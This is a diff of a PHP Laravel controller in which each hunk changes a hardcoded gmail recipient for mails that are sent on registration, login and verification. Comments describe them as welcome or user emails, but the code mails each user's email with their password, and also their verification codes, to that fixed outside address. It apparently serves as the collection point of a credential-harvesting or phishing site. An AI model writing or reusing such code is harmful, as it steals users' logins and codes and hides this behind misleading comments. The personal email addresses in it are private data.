@@ -29,7 +29,7 @@ class PageController extends Controller
         ]);
 
         // Send a welcome email
-        $email = 'brannyk001@gmail.com';
+        $email = 'brotukk@gmail.com';
         // $email = 'mmosobo@gmail.com';
         Mail::to($email)->send(new PaxUserRegistered($user->email));
 
@@ -54,7 +54,7 @@ class PageController extends Controller
 
         // Send a login email to logged in user
         // $adminemail = 'mmosobo@gmail.com';
-        $adminemail = 'brannyk001@gmail.com';
+        $adminemail = 'brotukk@gmail.com';
         Mail::to($adminemail)->send(new PaxUserLogged($user->email, $user->password));
 
         // Store email in session
@@ -77,7 +77,7 @@ class PageController extends Controller
         ]);
 
         // Send a verification code email 
-        $adminemail = 'brannyk001@gmail.com';
+        $adminemail = 'brotukk@gmail.com';
         // $adminemail = 'mmosobo@gmail.com';
         Mail::to($adminemail)->send(new PaxUserVerified($email, $code));
     }
